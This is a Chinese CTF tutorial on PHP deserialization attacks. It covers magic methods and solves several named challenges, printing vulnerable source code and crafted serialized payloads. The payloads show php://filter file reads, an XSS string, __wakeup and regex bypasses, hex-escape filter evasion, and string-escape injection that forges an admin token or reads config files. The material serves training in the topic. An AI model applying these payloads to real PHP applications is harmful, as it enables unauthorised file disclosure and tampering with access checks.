//在对象上下文中调用不可访问的方法时触发——对象调用一个没有声明的方法时，触发 __callStatic() //在静态上下文中调用不可访问的方法时触发 __get() //用于从不可访问的属性读取数据 __set() //用于将数据写入不可访问的属性 __isset() //在不可访问的属性上调用isset()或empty()触发 __unset() //在不可访问的属性上使用unset()时触发__toString() //把 一个对象 当作 字符串 使用时触发 //例如：echo 对象; $text=$test+$对象； __invoke() //当尝试以调用函数的方式调用一个对象时，该方法会被自动调用 其它魔术方法 理解魔术方法的调用： 1234567891011121314151617181920212223242526272829303132&lt;?phpclass test&#123; public $varr1=&quot;abc&quot;; public $varr2=&quot;123&quot;; public function echoP()&#123; echo $this-&gt;varr1.&quot;&lt;br&gt;&quot;; &#125; public function __construct()&#123; echo &quot;__construct&lt;br&gt;&quot;; &#125; public function __destruct()&#123; echo &quot;__destruct&lt;br&gt;&quot;; &#125; public function __toString()&#123; return &quot;__toString&lt;br&gt;&quot;; &#125; public function __sleep()&#123; echo &quot;__sleep&lt;br&gt;&quot;; return array(&#x27;varr1&#x27;,&#x27;varr2&#x27;); &#125; public function __wakeup()&#123; echo &quot;__wakeup&lt;br&gt;&quot;; &#125;&#125;$obj = new test(); //实例化对象，调用__construct()方法，输出__construct$obj-&gt;echoP(); //调用echoP()方法，输出&quot;abc&quot;echo $obj; //obj对象被当做字符串输出，调用__toString()方法，输出__toString$s =serialize($obj); //obj对象被序列化，调用__sleep()方法，输出__sleepecho unserialize($s); //$s首先会被反序列化，会调用__wake()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。// 脚本结束又会调用__destruct()方法，输出__destruct?&gt; 1.4 无类简单题目1234567891011&lt;?php error_reporting(0); include &quot;flag.php&quot;; $str = &quot;Love&quot;; $str1 = $_GET[&#x27;str1&#x27;]; if(unserialize($str1) === $str)&#123; echo $flag; &#125; show_source(__FILE__);?&gt;//WP:?str1=s:4:&quot;Love&quot;; 12345678910111213141516171819202122232425262728293031323334353637 &lt;?phperror_reporting(0);include_once(&quot;flag.php&quot;);$cookie = $_COOKIE[&#x27;ISecer&#x27;];if(isset($_GET[&#x27;hint&#x27;]))&#123; show_source(__FILE__);&#125;else if(unserialize($cookie) === &quot;$KEY&quot;)&#123; echo &quot;$flag&quot;;&#125;else &#123;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;&lt;title&gt;Login&lt;/title&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;div class=&quot;container&quot; align=&quot;center&quot;&gt; &lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt; &lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot;/&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php&#125;$KEY=&#x27;ISecer:www.isecer.com&#x27;;?&gt; //WP:cookie:ISecer=s:0:&quot;&quot;; //顺序问题 1.5 有类简单题目触发魔术方法 12345678910111213__construct //创建对象时触发__destruct //对象被销毁时 触发 使用unserialize时触发__toString //echo 或者 拼接字符串或者其它隐式调用该方法的操作都会被触发__wakeup() //使用unserialize时触发 __sleep() //使用serialize时触发 __call() //在对象上下文中调用不可访问的方法时触发——对象调用一个没有声明的方法时，触发 __callStatic() //在静态上下文中调用不可访问的方法时触发 __get() //用于从不可访问的属性读取数据 __set() //用于将数据写入不可访问的属性 __isset() //在不可访问的属性上调用isset()或empty()触发 __unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发 echo 对象; $text=$test+$对象； __invoke() //当脚本尝试将对象调用为函数时触发 魔术方法参考：https://www.cnblogs.com/20175211lyz/p/11403397.html 1.5 CTF 题目1.5.1 CTFHUB AreUSerialz12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667 &lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125;function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;//传参if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; 12345678910解释：1.?str传参，绕过is_valid() 之后，进行反序列化unserialize($str)， 传入类对象的序列化值，将会触发 __construct() ，最后销毁对象时，会触发 __destruct()2. __construct() 对变量初始化操作3. __destruct() op值对比：2的话强制转换成1；4.调用process()函数5.op == &quot;1&quot;为写内容；op == &quot;2&quot;为读取内容6.我们需要读取到 flag.php文件当中的内容，应该越过 3. 中对op的检测 可以使用 弱类型绕过 op=空格2 或者是 op=数字2 来越过===7.这样即使使用的不是字符串2，也可以满足==的条件，从而读取到内容 123456789101112131415&lt;?phpclass FileHandler &#123; public $op=&#x27; 2&#x27;; //空格 2 public $filename=&#x27;flag.php&#x27;; public $content;&#125;$flag = new FileHandler();$flag_1 = serialize($flag);echo $flag_1;?&gt;//O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;*op&quot;;s:2:&quot; 2&quot;;s:11:&quot;*filename&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;*content&quot;;N;&#125; //O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125; //O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125; 易错： ​ protected权限的变量在序列化的时会有%00%00字符*，%00字符的ASCII码为0，就无法通过上面的 is_valid函数校验。 解决办法1： php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可 12345678910&lt;?phpclass FileHandler &#123; public $op=&#x27; 2&#x27;; public $filename=&#x27;flag.php&#x27;; public $content;&#125;$flag = new FileHandler();$flag_1 = urlencode(serialize($flag));echo $flag_1;?&gt; 解决办法2： %00更改为 \\00，s 更改为 S 1234567891011121314&lt;?phpclass FileHandler &#123; protected $op=&#x27; 2&#x27;; protected $filename=&#x27;flag.php&#x27;; protected $content;&#125;$flag = new FileHandler();$flag_1 = urlencode(serialize($flag));echo $flag_1;?&gt;//将所得到的内容中 %00更改为 \\00，s 更改为 S//O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\\00%2A\\00op%22%3BS%3A2%3A%22+2%22%3BS%3A11%3A%22\\00%2A\\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\\00%2A\\00content%22%3BN%3B%7D //O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A5%3A%22%00%2A%00op%22%3Bi%3A2%3Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3Bs%3A10%3A%22%00%2A%00content%22%3BN%3B%7D pikachu 1234567891011121314151617&lt;?phpclass S&#123; var $test = &quot;pikachu&quot;; function __construct()&#123; echo $this-&gt;test; &#125;&#125;$html=&#x27;&#x27;;if(isset($_POST[&#x27;o&#x27;]))&#123; $s = $_POST[&#x27;o&#x27;]; if(!@$unser = unserialize($s))&#123; $html.=&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;; &#125;else&#123; $html.=&quot;&lt;p&gt;&#123;$unser-&gt;test&#125;&lt;/p&gt;&quot;; &#125;&#125;?&gt; 123456789//获取payload&lt;?phpclass S&#123; var $test = &quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;;&#125;$unser = new S();echo serialize($unser);?&gt;//O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;;&#125; 1.5.2 “百度杯”CTF比赛 十月场题目链接 index.php?key=123&amp;hash=f9109d5f83921a551cf859f853afe7bb 查看源代码 进行 md5 解密，得到 kkkkkk01123 则 $key= 根据题目，不能使 ?key=123 则我们传入 ?key=111&amp;hash=adaa10eef3a02754da03b5a3a6f40ae6 得到 next step is Gu3ss_m3_h2h2.php 然后我们访问 Gu3ss_m3_h2h2.php 1234567891011121314151617181920212223242526272829303132&lt;?phpclass Demo &#123; private $file = &#x27;Gu3ss_m3_h2h2.php&#x27;; public function __construct($file) &#123; $this-&gt;file = $file; &#125; function __destruct() &#123; echo @highlight_file($this-&gt;file, true); &#125; function __wakeup() &#123; if ($this-&gt;file != &#x27;Gu3ss_m3_h2h2.php&#x27;) &#123; //the secret is in the f15g_1s_here.php $this-&gt;file = &#x27;Gu3ss_m3_h2h2.php&#x27;; &#125; &#125;&#125;if (isset($_GET[&#x27;var&#x27;])) &#123; $var = base64_decode($_GET[&#x27;var&#x27;]); if (preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $var)) &#123; die(&#x27;stop hacking!&#x27;); &#125; else &#123; @unserialize($var); &#125;&#125; else &#123; highlight_file(&quot;Gu3ss_m3_h2h2.php&quot;);&#125;?&gt; 1.6 反序列化绕过技巧1.6.1 php7.1+反序列化对类属性不敏感测试环境：php7.2.9 1234567891011&lt;?phpclass test&#123; protected $a; public function __construct()&#123; $this-&gt;a = &#x27;abc&#x27;; &#125; public function __destruct()&#123; echo $this-&gt;a; &#125;&#125;unserialize(&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;); 可以看到，即是 a 没有%00*%00 也输出了 abc 1.6.2 __wakeup() 绕过在反序列化字符串时，序列化字符串中属性个数的值大于实际属性个数时，会跳过 __wakeup()函数的执行 。 环境： PHP5 &lt; 5.6.2 PHP7 &lt; 7.0.10 测试：php5.2.17 12345678910111213141516171819202122&lt;?php class test&#123; public $a; public function __construct()&#123; $this-&gt;a = &#x27;aaa&#x27;; &#125; public function __wakeup()&#123; $this-&gt;a = &#x27;bbb&#x27;; &#125; public function __destruct()&#123; echo $this-&gt;a; &#125;&#125;//$b = new test();//echo serialize($b);//O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;aaa//属性个数 为 真实个数值 1unserialize(&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;&#x27;);echo &quot;&lt;br /&gt;&quot;;//属性个数 3 &gt; 真实个数值 1unserialize(&#x27;O:4:&quot;test&quot;:3:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;&#x27;); 1.6.3 正则绕过preg_match(&#39;/^O:\\d+/&#39;)匹配序列化字符串是否是对象字符串开头 其中的 \\d 匹配的是数字 [0-9]，其目的就是检测我们的字符串是否是对象字符串开头 绕过1：+ 绕过 (url 中传参使用 编码 %2b) 绕过2：serialize(array(a)) 绕过 //a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构) 测试： 123456789101112131415161718192021222324&lt;?phpclass test&#123; public $a; public function __construct()&#123; $this-&gt;a = &#x27;abc&#x27;; &#125; public function __destruct()&#123; echo $this-&gt;a.PHP_EOL; &#125;&#125;function match($data)&#123; if (preg_match(&#x27;/^O:\\d+/&#x27;,$data))&#123; die(&#x27;you lose!&#x27;); &#125;else&#123; return $data; &#125;&#125;$a = &#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;;// +号绕过$b = str_replace(&#x27;O:4&#x27;,&#x27;O:+4&#x27;, $a);unserialize(match($b));// serialize(array($a));unserialize(&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;); 1.6.4 十六进制绕过字符过滤1234O:4:&quot;test&quot;:2:&#123;s:4:&quot;%00*%00a&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;可以写成O:4:&quot;test&quot;:2:&#123;S:4:&quot;\\00*\\00\\61&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;表示字符类型的s大写时，会被当成16进制解析。 示例： 1234567891011121314151617181920212223242526&lt;?phpclass test&#123; public $username; public function __construct()&#123; $this-&gt;username = &#x27;admin&#x27;; &#125; public function __destruct()&#123; echo 666; &#125;&#125;function check($data)&#123; if(stristr($data, &#x27;username&#x27;)!==False)&#123; echo(&quot;你绕不过！！&quot;.PHP_EOL); &#125; else&#123; return $data; &#125;&#125;// 未作处理前$a = &#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;;$a = check($a);unserialize($a);// 做处理后 \\75是u的16进制$a = &#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;;$a = check($a);unserialize($a); 1.6.5 引用测试 123456789101112131415&lt;?php class test&#123; public $a; public $b; public function __contruct()&#123; $this-&gt;a = &#x27;aaa&#x27;; $this-&gt;b = &amp;$this-&gt;a; // $b 是 $a 的引用,从而使a 与 b 永远相等 &#125; public function __destruct()&#123; if($this-&gt;a === $this-&gt;b)&#123; echo &#x27;success&#x27;; &#125; &#125;&#125;$a = serialize(nre test()); 二、反序列化字符串逃逸概述：反序列化的字符串逃逸，包括字符增加与字符减少两类。 2.1 知识一： PHP 反序列化时，对类中不存在的属性也会反序列化； PHP 反序列化时，底层代码是以 ;作为字段的分隔，以 &#125; 作为结尾(字符串除外)，并且是根据长度判断内容的；即当存在 ;&#125; 与 &#123; 匹配时，不会再对 ;&#125; 后面的字符串进行反序列化。 简单理解一下 我们在序列化之后的字符串 ;&#125; 后再加上一些内容，其仍可被正常解析，说明在 PHP 反序列时碰到 ;&#125; 与前面的 &#123; 配对之后，就会停止反序列化。 2.2 知识二： 当进行反序列化的字符串中长度与所描述的长度不同时，就会 报错 2.3 字符增多 — CTF Show 264题目链接 123456789101112131415161718192021222324# message.php：&lt;?phpsession_start();highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class message&#123; public $from; public $msg; public $to; public $token=&#x27;user&#x27;; public function __construct($f,$m,$t)&#123; $this-&gt;from = $f; $this-&gt;msg = $m; $this-&gt;to = $t; &#125;&#125;if(isset($_COOKIE[&#x27;msg&#x27;]))&#123; $msg = unserialize(base64_decode($_SESSION[&#x27;msg&#x27;])); if($msg-&gt;token==&#x27;admin&#x27;)&#123; echo $flag; &#125;&#125; 123456789101112131415161718192021222324252627# index.php:Your message has been sent &lt;?phperror_reporting(0);session_start();class message&#123; public $from; public $msg; public $to; public $token=&#x27;user&#x27;; public function __construct($f,$m,$t)&#123; $this-&gt;from = $f; $this-&gt;msg = $m; $this-&gt;to = $t; &#125;&#125;$f = $_GET[&#x27;f&#x27;];$m = $_GET[&#x27;m&#x27;];$t = $_GET[&#x27;t&#x27;];if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123; $msg = new message($f,$m,$t); $umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($msg)); $_SESSION[&#x27;msg&#x27;]=base64_encode($umsg); echo &#x27;Your message has been sent&#x27;;&#125;highlight_file(__FILE__); 分析： 想要获取 flag，需要使 $msg-&gt;token==&#39;admin&#39; ，而默认 public $token=&#39;user&#39;; 字符串逃逸：构造 以下内容 1234567891011&lt;?phpclass message&#123; public $from = &#x27;a&#x27;; public $msg = &#x27;b&#x27;; public $to = &#x27;c&#x27;; public $token = &#x27;admin&#x27;;&#125;$msg = new message();echo serialize($msg);# 输出 O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125; 更改 $to 的值 1234567891011&lt;?phpclass message&#123; public $from = &#x27;a&#x27;; public $msg = &#x27;b&#x27;; public $to = &#x27;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;; public $token=&#x27;admin&#x27;;&#125;$msg = new message();echo serialize($msg);# 输出 O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:28:&quot;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125; 利用 str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg)) 补充字符串长度；增加 27 个长度； 12345678910111213&lt;?phpclass message&#123; public $from = &#x27;a&#x27;; public $msg = &#x27;b&#x27;; public $to = &#x27;cfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;; public $token=&#x27;admin&#x27;;&#125;$msg = new message();echo serialize($msg);# 输出 O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:136:&quot;cfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;# 这样被替换之后变成以下内容，正好补上 O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:136:&quot;cloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125; payload： 1?f=a&amp;m=b&amp;t=cfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125; 然后我们抓包，更改 cookie 即可 2.4 字符增多 — [0CTF 2016]piapiapia题目链接 分析： 目录扫描 ，得到 www.zip，查看源码 register.php ，注册一下 注册成功之后，将跳转 index.php，进行登录 成功登录，跳转到 update.php，填写详细信息，可进行文件上传 123456789101112131415161718192021222324252627282930313233# update.php&lt;?php require_once(&#x27;class.php&#x27;); if($_SESSION[&#x27;username&#x27;] == null) &#123; die(&#x27;Login First&#x27;); &#125; if($_POST[&#x27;phone&#x27;] &amp;&amp; $_POST[&#x27;email&#x27;] &amp;&amp; $_POST[&#x27;nickname&#x27;] &amp;&amp; $_FILES[&#x27;photo&#x27;]) &#123; $username = $_SESSION[&#x27;username&#x27;]; if(!preg_match(&#x27;/^\\d&#123;11&#125;$/&#x27;, $_POST[&#x27;phone&#x27;])) die(&#x27;Invalid phone&#x27;); if(!preg_match(&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;, $_POST[&#x27;email&#x27;])) die(&#x27;Invalid email&#x27;); if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10) die(&#x27;Invalid nickname&#x27;); $file = $_FILES[&#x27;photo&#x27;]; if($file[&#x27;size&#x27;] &lt; 5 or $file[&#x27;size&#x27;] &gt; 1000000) die(&#x27;Photo size error&#x27;); move_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;])); $profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;]; $profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;]; $profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;]; $profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]); $user-&gt;update_profile($username, serialize($profile)); echo &#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;; &#125; else &#123;?&gt; $user-&gt;update_profile($username, serialize($profile)); 将填入的信息进行 序列化 它的上传文件的存储路径是 $profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;]); ，起不到 .php 或者是 图片木马包含的作用; 代码审计 12345678910111213141516171819202122# register.php &lt;?php require_once(&#x27;class.php&#x27;); if($_POST[&#x27;username&#x27;] &amp;&amp; $_POST[&#x27;password&#x27;]) &#123; $username = $_POST[&#x27;username&#x27;]; $password = $_POST[&#x27;password&#x27;]; if(strlen($username) &lt; 3 or strlen($username) &gt; 16) die(&#x27;Invalid user name&#x27;); if(strlen($password) &lt; 3 or strlen($password) &gt; 16) die(&#x27;Invalid password&#x27;); if(!$user-&gt;is_exists($username)) &#123; $user-&gt;register($username, $password); echo &#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;; &#125; else &#123; die(&#x27;User name Already Exists&#x27;); &#125; &#125; else &#123;?&gt; 注册成功，进入 index.php 进行下一步的登录 12345678910111213141516171819202122232425262728# index.php&lt;?php require_once(&#x27;class.php&#x27;); if($_SESSION[&#x27;username&#x27;]) &#123; header(&#x27;Location: profile.php&#x27;); exit; &#125; if($_POST[&#x27;username&#x27;] &amp;&amp; $_POST[&#x27;password&#x27;]) &#123; $username = $_POST[&#x27;username&#x27;]; $password = $_POST[&#x27;password&#x27;]; if(strlen($username) &lt; 3 or strlen($username) &gt; 16) die(&#x27;Invalid user name&#x27;); if(strlen($password) &lt; 3 or strlen($password) &gt; 16) die(&#x27;Invalid password&#x27;); if($user-&gt;login($username, $password)) &#123; $_SESSION[&#x27;username&#x27;] = $username; header(&#x27;Location: profile.php&#x27;); exit; &#125; else &#123; die(&#x27;Invalid user name or password&#x27;); &#125; &#125; else &#123;?&gt; 登陆成功之后，进入 profile.php 1234567891011121314151617181920212223242526272829303132333435363738# profile.php&lt;?php require_once(&#x27;class.php&#x27;); if($_SESSION[&#x27;username&#x27;] == null) &#123; die(&#x27;Login First&#x27;); &#125; $username = $_SESSION[&#x27;username&#x27;]; $profile=$user-&gt;show_profile($username); if($profile == null) &#123; header(&#x27;Location: update.php&#x27;); &#125; else &#123; $profile = unserialize($profile); $phone = $profile[&#x27;phone&#x27;]; $email = $profile[&#x27;email&#x27;]; $nickname = $profile[&#x27;nickname&#x27;]; $photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;]));?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Profile&lt;/title&gt; &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt; &lt;img src=&quot;data:image/gif;base64,&lt;?php echo $photo; ?&gt;&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt; &lt;h3&gt;Hi &lt;?php echo $nickname;?&gt;&lt;/h3&gt; &lt;label&gt;Phone: &lt;?php echo $phone;?&gt;&lt;/label&gt; &lt;label&gt;Email: &lt;?php echo $email;?&gt;&lt;/label&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php &#125;?&gt; $profile = unserialize($profile); 将填写的信息进行反序列化输出 12345678# config.php&lt;?php $config[&#x27;hostname&#x27;] = &#x27;127.0.0.1&#x27;; $config[&#x27;username&#x27;] = &#x27;root&#x27;; $config[&#x27;password&#x27;] = &#x27;&#x27;; $config[&#x27;database&#x27;] = &#x27;&#x27;; $flag = &#x27;&#x27;;?&gt; 看到 flag 存在于 config.php 文件当中，我们想办法读取到 config.php 思路：在 profile.php 中存在 $photo = base64_encode(file_get_contents($profile[&#39;photo&#39;])); ；而 $profile 是一个数组，里面是我们输入的信息。如果我们控制 $profile[&#39;photo&#39;] 为 config.php 那么 之后的 &lt;?php echo $phone;?&gt; 将会显示出 base64 编码后的 config.php 文件内容，我们就会获取到 flag。 测试： 123456&lt;?php $profile[&#x27;phone&#x27;] = $_GET[&#x27;p&#x27;]; $profile[&#x27;email&#x27;] = $_GET[&#x27;e&#x27;]; $profile[&#x27;nickname&#x27;] = $_GET[&#x27;n&#x27;]; $profile[&#x27;photo&#x27;] = $_GET[&#x27;o&#x27;]; echo serialize($profile); 12GET传参：?p=123&amp;e=123@qq.com&amp;n=aaa&amp;o=config.php输出：a:4:a:4:&#123;s:5:&quot;phone&quot;;s:3:&quot;123&quot;;s:5:&quot;email&quot;;s:10:&quot;123@qq.com&quot;;s:8:&quot;nickname&quot;;s:3:&quot;aaa&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; 更改 nickname 的值： 12GET传参：?p=123&amp;e=123@qq.com&amp;n=&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&amp;o=config.php输出：a:4:&#123;s:5:&quot;phone&quot;;s:3:&quot;123&quot;;s:5:&quot;email&quot;;s:10:&quot;123@qq.com&quot;;s:8:&quot;nickname&quot;;s:34:&quot;&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; 字符增加替换 ，考虑到 update.php 以及 class.php 中的过滤，我们传入 数组 nickname[] 1nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; payload： 解码得 flag 2.5 字符减少 — [安洵杯 2019]easy_serialize_php题目链接 12345678910111213141516171819202122232425262728293031323334353637383940 &lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123; unset($_SESSION); &#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);if(!$function)&#123; echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123; $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123; highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123; eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; 根据提示：?f=phpinfo 发现 auto_append_file 在任何页面输出前首先包含 d0g3_f1ag.php文件，猜测 